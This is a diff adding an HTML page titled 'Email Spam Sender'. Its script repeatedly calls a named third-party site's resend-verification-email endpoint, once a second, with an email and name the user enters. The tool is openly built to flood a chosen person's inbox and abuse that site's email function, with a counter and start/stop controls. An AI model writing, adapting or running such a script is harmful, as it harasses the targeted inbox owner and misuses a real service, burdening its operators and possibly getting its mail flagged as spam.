@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Spam Sender</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            color: #343a40;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+        }
+
+        .controls {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .controls > * {
+            margin: 10px;
+        }
+
+        button {
+            font-size: 16px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        #startButton {
+            background: linear-gradient(20deg, black, blue);
+            color: white;
+        }
+
+        #stopButton {
+            background: linear-gradient(20deg, red, blue);
+            color: white;
+        }
+
+        button:disabled {
+            background-color: #6c757d;
+            cursor: not-allowed;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+
+        input[type="email"],
+        input[type="text"] {
+            padding: 10px;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(20deg, white, blue);
+            color: #212529;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: none;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <h1>Email Spam Sender</h1>
+    <div class="controls">
+        <input type="email" id="emailInput" placeholder="Enter email" required>
+        <input type="text" id="nameInput" placeholder="Enter name" required>
+        <button id="startButton">Start Sending</button>
+        <button id="stopButton" disabled>Stop Sending</button>
+    </div>
+    <p id="status">Requests sent: 0</p>
+    <div class="notification" id="notification"></div>
+
+    <script>
+        const interval = 1000; // 1 second
+        let intervalId;
+        let requestCount = 0;
+        let email = '';
+        let name = '';
+
+        function sendRequest() {
+            const url = `https://pasukansalman.smartseller.co.id/register/resend_verification_email?email=${email}&name=${name}`;
+            fetch(url)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    requestCount++;
+                    document.getElementById('status').innerText = `Requests sent: ${requestCount}`;
+                    console.log(`Membuka ${url} pada ${new Date().toLocaleString()}`);
+                    return response.text();
+                })
+                .then(data => {
+                    // Process the data if needed
+                })
+                .catch(error => {
+                    console.error(`Error: ${error}`);
+                });
+        }
+
+        function showNotification(message) {
+            const notification = document.getElementById('notification');
+            notification.innerText = message;
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        document.getElementById('startButton').addEventListener('click', () => {
+            email = document.getElementById('emailInput').value;
+            name = document.getElementById('nameInput').value;
+            if (!email || !name) {
+                showNotification('Masukan Email Anda Dan Nama Pesan @zannmods.');
+                return;
+            }
+            intervalId = setInterval(sendRequest, interval);
+            document.getElementById('startButton').disabled = true;
+            document.getElementById('stopButton').disabled = false;
+            document.getElementById('emailInput').disabled = true;
+            document.getElementById('nameInput').disabled = true;
+            showNotification('Send success.');
+        });
+
+        document.getElementById('stopButton').addEventListener('click', () => {
+            clearInterval(intervalId);
+            document.getElementById('startButton').disabled = false;
+            document.getElementById('stopButton').disabled = true;
+            document.getElementById('emailInput').disabled = false;
+            document.getElementById('nameInput').disabled = false;
+            showNotification('Stop success.');
+        });
+    </script>
+</body>
+</html>
